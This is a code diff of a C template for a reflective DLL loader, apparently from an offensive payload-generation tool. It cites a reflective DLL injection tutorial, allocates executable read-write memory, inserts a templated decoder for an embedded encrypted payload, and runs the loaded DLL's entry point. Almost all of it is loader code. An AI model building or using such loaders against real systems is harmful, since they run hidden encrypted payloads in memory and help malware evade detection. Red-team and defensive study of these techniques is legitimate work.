@@ -10,11 +10,12 @@ char *supermega_payload;
 
 /* DLL loader
 
-   This code will load a DLL into memory, resolve its imports, apply relocations, and execute it.
+   This code will load a DLL (not a shellcode!) into memory, 
+     resolve its imports, apply relocations, and execute it.
 
    Loader is based on: 
-   https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
-   with some patches to make it work here
+     https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
+     with some patches to make it work here
 */
 
 
@@ -40,7 +41,7 @@ void mymemcpy(void* dest, const void* src, size_t n) {
 }
 
 
-DWORD_PTR load_shellcode(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
+DWORD_PTR load_dll(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 	// get this module's image base address
 	PVOID imageBase = GetModuleHandleA(NULL);
 
@@ -144,20 +145,17 @@ DWORD_PTR load_shellcode(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoe
 
 int main()
 {
-	// Read DLL
-	HANDLE dll = CreateFileA("C:\\Tools\\TestDll.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
-	DWORD64 dllSize = GetFileSize(dll, NULL);
-	
-	// Put it into memory
-	LPVOID dllBytes = VirtualAlloc(0, dllSize, 0x3000, PAGE_EXECUTE_READWRITE);
-	DWORD outSize = 0;
-	ReadFile(dll, dllBytes, dllSize, &outSize, NULL);
-	CloseHandle(dll);
+	char* dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
 
-	// load the DLL
+	// FROM supermega_payload[] 
+	// TO dest[]
+	// Including decryption
+{{ plugin_decoder }}
+
+	// Load the DLL at dest
 	DWORD_PTR dllBase;
 	DWORD aoep;
-	load_shellcode(dllBytes, &dllBase, &aoep);
+	load_dll( (void *) dest, &dllBase, &aoep);
 	DLLEntry DllEntry = (DLLEntry)(dllBase + aoep);
 	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
 
